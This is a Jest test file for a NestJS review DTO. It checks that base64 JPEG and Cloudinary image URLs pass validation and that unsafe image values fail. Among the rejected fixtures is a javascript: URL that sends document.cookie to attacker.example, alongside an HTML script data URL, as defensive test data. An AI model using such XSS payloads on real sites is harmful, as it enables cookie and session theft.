import 'reflect-metadata';
import { ValidationPipe } from '@nestjs/common';
import { CreateReviewDto } from './review.dto';

/** Đúng cấu hình ValidationPipe toàn cục ở main.ts. */
const pipe = new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true });
const asBody = (value: Record<string, unknown>) =>
  pipe.transform(value, { type: 'body', metatype: CreateReviewDto, data: undefined });

const JPEG_DATA_URL = `data:image/jpeg;base64,${'A'.repeat(300_000)}==`;

// ENGAGE-6: miniapp chưa cấu hình Cloudinary nên ảnh đánh giá luôn là base64 nén (~200-500 nghìn ký tự), trong khi
// DTO cũ chặn mỗi ảnh ≤ 500 ký tự → mọi đánh giá có ảnh bị 400 bằng tiếng Anh.
describe('CreateReviewDto.images (ENGAGE-6)', () => {
  it('nhận ảnh base64 nén như miniapp gửi khi chưa có Cloudinary', async () => {
    const dto = (await asBody({ rating: 5, images: [JPEG_DATA_URL] })) as CreateReviewDto;
    expect(dto.images).toHaveLength(1);
  });

  it('nhận URL https trên host upload Cloudinary', async () => {
    await expect(
      asBody({ rating: 4, images: ['https://res.cloudinary.com/demo/image/upload/v1/reviews/a.jpg'] }),
    ).resolves.toBeDefined();
  });

  it.each([
    ["javascript:fetch('https://attacker.example/x?'+document.cookie)"],
    ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='],
    ['http://res.cloudinary.com/demo/image/upload/a.jpg'],
    ['https://attacker.example/a.jpg'],
  ])('từ chối ảnh không an toàn %s', async (img) => {
    await expect(asBody({ rating: 5, images: [img] })).rejects.toThrow();
  });

  it('từ chối ảnh base64 quá khổ và quá 5 ảnh', async () => {
    await expect(asBody({ rating: 5, images: [`data:image/jpeg;base64,${'A'.repeat(1_100_000)}`] })).rejects.toThrow();
    await expect(asBody({ rating: 5, images: Array(6).fill(JPEG_DATA_URL) })).rejects.toThrow();
  });

  it('đánh giá không ảnh vẫn hợp lệ', async () => {
    await expect(asBody({ rating: 5, comment: 'Rất ổn' })).resolves.toBeDefined();
  });
});
